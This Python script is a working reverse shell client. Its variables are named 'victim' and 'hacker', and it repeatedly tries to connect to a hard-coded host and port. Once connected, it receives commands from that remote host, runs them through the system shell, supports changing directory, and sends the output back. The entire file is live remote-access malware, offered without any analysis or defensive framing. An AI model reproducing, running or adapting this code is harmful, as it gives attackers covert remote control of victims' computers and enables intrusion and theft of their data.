import socket
import subprocess
import time
import os

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hacker_ip = "192.168.100.17"
hacker_port = 10000

while True:
    try:
        victim_socket.connect((hacker_ip, hacker_port))
        break
    except:
        time.sleep(5)

while True:
    try:
        command = victim_socket.recv(1024).decode('utf-8')
    
    except Exception as e:
        print(f"Connection lost: {e}")
        break


    if command == "":
        continue

    if command == "stop":
        print(f"{command} is executed successfully!")
        break

    if command.startswith("cd"):
        path_to_move = command[3:].strip()
        
        if not path_to_move:
            current_dir = os.getcwd()
            victim_socket.send(f"Current directory: {current_dir}".encode())
            continue
       
        try:
            os.chdir(path_to_move)
            print(f"{command} is executed successfully!")
            victim_socket.send(f"Changed directory to {os.getcwd()}".encode())

        except (FileNotFoundError, PermissionError, OSError) as e:
            victim_socket.send(f"Failed to change directory: {str(e)}".encode())

        continue

    try:
        encoding = "utf-8"
        if(os.name == "nt"):
            encoding = "cp437"
        
        command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        decoded_output = command_output.decode(encoding, errors="replace").strip()
        
        if(decoded_output == ""):
            command_output = f"{command} executed successfully (no output)!".encode()
        else:
            command_output = decoded_output.encode("utf-8")

    except subprocess.CalledProcessError as e:
        if e.output:
            error_output = e.output.decode(encoding, errors="replace")
        else:
            error_output = str(e)
        command_output = f"Command failed:\n{error_output}".encode()

    except Exception as e:
        command_output = f"Error: {str(e)}".encode()

    print(f"{command} is executed successfully!")
    victim_socket.send(command_output)

victim_socket.close()